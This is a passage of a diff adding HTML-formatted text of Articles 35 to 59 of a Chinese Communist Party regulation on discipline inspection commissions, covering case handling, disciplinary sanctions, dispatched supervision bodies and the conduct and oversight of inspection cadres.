+<p>  <strong>第三十五条</strong>　党的各级纪律检查委员会应当畅通信访举报渠道，依规依纪受理党员群众的信访举报，健全分办、交办、督办、反馈等工作机制。</p>
+<p>  对信访举报情况应当定期分析研判，对反映的典型性、普遍性、苗头性问题提出有针对性的工作建议，形成综合分析或者专题分析材料，向同级党委、上级纪委报告或者向有关党组织通报。</p>
+<p>  对于信访举报反映、监督执纪中发现以及巡视巡察机构和其他单位移交的问题线索，应当实行集中管理，采取谈话函询、初步核实、暂存待查、予以了结等方式分类处置，做到件件有着落。</p>
+<p>  <strong>第三十六条</strong>　党的各级纪律检查委员会对反映党组织、党员的问题线索经过初步核实，对于涉嫌违纪、需要追究党纪责任的，应当按照规定予以立案审查。</p>
+<p>  各级纪律检查委员会按照管理权限，审查违反党章和其他党内法规的比较重要或者复杂的案件，主要包括：同级党委委员、候补委员，同级纪委委员，同级党委管理的党员干部，以及同级党委工作部门，同级党委批准设立的党组（党委），下一级党委、纪委等涉嫌违纪案件；案情重大复杂，需要采取重要审查措施的案件；同级党委、上级纪委交办的其他案件。</p>
+<p>  地方各级纪律检查委员会和基层纪律检查委员会对于处理涉及同级党委委员、候补委员，同级党委管理的正职领导干部，同级纪委常委、监委委员等人员的案件，以及涉及政治问题、国家安全等特别重要或者复杂案件中的问题和处理的结果，在向同级党委报告的同时，即向上级纪委一并报告。</p>
+<p>  纪律审查工作应当依规依纪采取谈话、查询、调取、暂扣、封存、勘验检查、鉴定等措施，以及通过要求相关组织作出说明等方式，收集证据，查明事实，处置违纪所得。</p>
+<p>  <strong>第三十七条</strong>　党的各级纪律检查委员会根据纪律审查结果，依据相关党内法规，对应当追究党纪责任的党组织和党员进行纪律处理、处分。</p>
+<p>  对于各级纪律检查委员会立案审查的党员，需要给予纪律处分的，一般由负责审查的纪委提出处分意见，经被审查人所在党支部的党员大会讨论形成决议，并按照规定报党的基层委员会批准或者有权处分的党组织审批。在特殊情况下，县级和县级以上各级纪委有权直接决定给予党员纪律处分，主要包括：案情涉密、敏感；违纪案件跨地区跨部门跨单位；违纪党员所在的基层党组织无法正常履行职责、不正确履行职责或者其负责人同违纪问题有关联；违纪党员为县级或者县级以上各级党委管理的党员干部；党章和其他党内法规明确规定的相关情况。</p>
+<p>  地方各级纪律检查委员会和基层纪律检查委员会对同级党的委员会处理案件的决定有不同意见的，可以请求上一级纪委予以复查。</p>
+<p>  建立健全处分决定执行公示、回访教育、情况报告和专项检查等制度，加强与相关党组织及职能部门的协作沟通，确保处分决定得到严格执行。</p>
+<p>  <strong>第三十八条</strong>　党的纪律检查委员会发现党组织、党的领导干部在党的建设、党的事业中失职失责的，应当依据相关党内法规开展问责调查，查明失职失责问题，向党的委员会提出责任追究的建议，或者按照规定的权限和程序作出问责决定。</p>
+<p>  <strong>第三十九条</strong>　党的纪律检查委员会对于党员因合法权益受到党组织或者其他党员侵害提出的控告，按照规定予以受理，及时恰当进行处理。通过办理党员的控告发现的违纪违法问题，按照本章规定进行检查和处理。</p>
+<p>  对于党员因不服纪委或者其他党组织给予本人的处理、处分而提出的申诉，按照规定予以受理，进行复议复查。</p>
+<p>  <strong>第四十条</strong>　党的各级纪律检查委员会应当依据相关党内法规，加强对党组织和领导干部履行保障党员权利工作职责的监督检查，依规依纪查处侵犯党员权利的行为。开展监督执纪工作，应当落实保障党员权利的规定和要求。</p>
+<p>  <strong>第四十一条</strong>　在监督检查、纪律审查等过程中，应当注意查找分析监督对象所在党组织党风廉政建设、管理监督等方面存在的突出问题，采取制发纪律检查建议书或者其他适当方式，提出有关强化管党治党、净化政治生态、健全制度、整改纠正等意见建议，督促指导和推动有关地区、部门、单位党组织举一反三、切实整改。</p>
+<p>  对于涉及党的建设、党的事业的普遍性、倾向性问题，应当进行深入调研，形成专题报告，报送同级党委、上级纪委或者通报相关党组织，推动解决问题、规范决策、完善政策、健全制度。</p>
+<h2 id="第六章-派驻、派出机构"><a href="#第六章-派驻、派出机构" class="headerlink" title="第六章　派驻、派出机构"></a>第六章　派驻、派出机构</h2><p>  <strong>第四十二条</strong>　党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会向同级党和国家机关全面派驻纪检监察组，按照规定可以向国有企业、事业单位等其他组织和单位派驻纪检监察组。</p>
+<p>  党的中央和地方各级委员会派出党的机关工作委员会、街道工作委员会等代表机关的，党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会可以相应派出纪检监察工作委员会。</p>
+<p>  <strong>第四十三条</strong>　派驻机构是派出它的党的纪律检查委员会监察委员会的组成部分，由派出机关直接领导、统一管理。</p>
+<p>  派出机构在派出它的党的纪律检查委员会监察委员会和本级党的工作委员会双重领导下进行工作。派出机构按照规定开展纪律检查工作，领导管辖范围内机关纪委等纪检机构的工作。</p>
+<p>  <strong>第四十四条</strong>　派驻机构根据派出机关授权开展监督执纪问责工作：</p>
+<p>  （一）加强对驻在单位（含综合监督单位）的监督，重点对驻在单位领导班子及其成员、党组（党委）管理的领导班子及其成员等进行监督。</p>
+<p>  （二）监督促进驻在单位领导班子贯彻落实党的理论和路线方针政策、党中央决策部署，履行全面从严治党主体责任。</p>
+<p>  （三）经常、及时地向派出机关报告情况和问题。</p>
+<p>  （四）加强对驻在单位纪检机构的业务指导和监督检查，促进其履行监督责任。</p>
+<p>  （五）认真处理信访举报，对问题线索进行集中管理和处置。</p>
+<p>  （六）依规依纪开展纪律审查，严肃查处违纪问题。</p>
+<p>  （七）按照管理权限作出问责决定或者提出问责建议。</p>
+<p>  （八）协助驻在单位党组（党委）做好巡视巡察工作。</p>
+<p>  （九）完成派出机关交办的其他任务。</p>
+<p>  <strong>第四十五条</strong>　健全派驻监督工作机制，统筹协调派出机关内设监督检查室、派驻纪检监察组、地方纪检监察机关、巡视巡察机构等力量，通过“室组”联动监督、“室组地”联合办案等方式，提高派驻监督质量。</p>
+<p>  县（市、区）纪律检查委员会监察委员会开展派驻监督工作，应当保证派驻机构人员力量，推动监督工作向基层延伸，采取综合派驻、工作协作等方式，提升监督效能。</p>
+<h2 id="第七章-队伍建设和监督"><a href="#第七章-队伍建设和监督" class="headerlink" title="第七章　队伍建设和监督"></a>第七章　队伍建设和监督</h2><p>  <strong>第四十六条</strong>　党的各级纪律检查委员会必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，突出抓好党的政治建设，教育引导纪检干部不断提高政治判断力、政治领悟力、政治执行力，带头践行“两个维护”，敢于善于斗争，做到忠诚干净担当。</p>
+<p>  <strong>第四十七条</strong>　贯彻新时代党的组织路线，坚持党管干部，严把干部准入关，加强思想淬炼、政治历练、实践锻炼、专业训练，加强理论研究和学科建设，提高把握政策、监督执纪、做思想政治工作等能力，建设高素质专业化干部队伍。</p>
+<p>  <strong>第四十八条</strong>　加强作风建设和纪律建设，保证纪检干部严守政治纪律和政治规矩，模范遵守党的纪律和国家法律，坚持实事求是，深入开展调查研究，密切联系群众，树立纪律严明、作风深入、工作扎实、谦虚谨慎、秉公执纪的良好形象。</p>
+<p>  <strong>第四十九条</strong>　加强监督执纪规范化建设，健全法规制度，规范工作流程，牢固树立法治意识、程序意识、证据意识，依规依纪依法行使纪律检查权。</p>
+<p>  <strong>第五十条</strong>　党的纪律检查委员会必须接受最严格的约束和监督，在同级党委和上级纪委的领导、监督下强化自我监督，自觉接受党的组织和党员的监督。建立完善监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的工作机制，发挥内设干部监督机构、机关纪委等作用，加大监管和自我净化力度，坚决防治“灯下黑”。</p>
+<p>  党的纪律检查委员会应当自觉接受民主监督、群众监督、舆论监督等各方面监督。任何单位和个人对纪检机关、纪检干部的违纪违法行为，有权提出检举、控告。</p>
+<p>  <strong>第五十一条</strong>　严格执行纪检干部打听案情、过问案件、说情干预问题报告制度，有关情况应当登记备案。</p>
+<p>  纪检干部发现审查组工作人员未经批准接触被审查人、涉案人员及其特定关系人，或者存在交往情形的，应当及时报告并登记备案。</p>
+<p>  <strong>第五十二条</strong>　办理纪检事项的纪检干部存在可能影响事项公正处理情形的，应当主动申请回避，被审查人、检举控告人以及其他有关人员也有权要求其回避。</p>
+<p>  <strong>第五十三条</strong>　纪检干部应当严格执行保密制度，不准私自留存、隐匿、查阅、摘抄、复制、携带问题线索和涉案资料，严禁泄露审查工作情况。</p>
+<p>  纪检干部离职的，应当严格遵守有关离职后从业限制的规定，三年内不得从事与纪律检查工作相关的职业。</p>
+<p>  <strong>第五十四条</strong>　建立健全安全责任制，严格防范发生审查安全事故。组织开展经常性检查和不定期抽查，发现问题及时督促整改。</p>
+<p>  <strong>第五十五条</strong>　纪检干部有以案谋私、跑风漏气、滥用职权以及其他违规违纪违法行为的，必须严肃查处；构成犯罪的，依法追究刑事责任。</p>
+<p>  纪检机关及其领导干部履行职责过程中失职失责造成严重后果或者恶劣影响的，应当严肃问责。</p>
+<h2 id="第八章-附则"><a href="#第八章-附则" class="headerlink" title="第八章　附则"></a>第八章　附则</h2><p>  <strong>第五十六条</strong>　新疆生产建设兵团党的各级纪律检查委员会，党的地区纪律检查委员会和相当于地区纪委的其他纪律检查委员会，党组（党委）纪检组（纪委），纪律检查委员，参照执行本条例。</p>
+<p>  <strong>第五十七条</strong>　中央军事委员会可以根据本条例，制定相关规定。</p>
+<p>  <strong>第五十八条</strong>　本条例由中央纪律检查委员会负责解释。</p>
+<p>  <strong>第五十九条</strong>　本条例自发布之日起施行。</p>
 ]]></content>
       <categories>
         <category>综合法规</category>
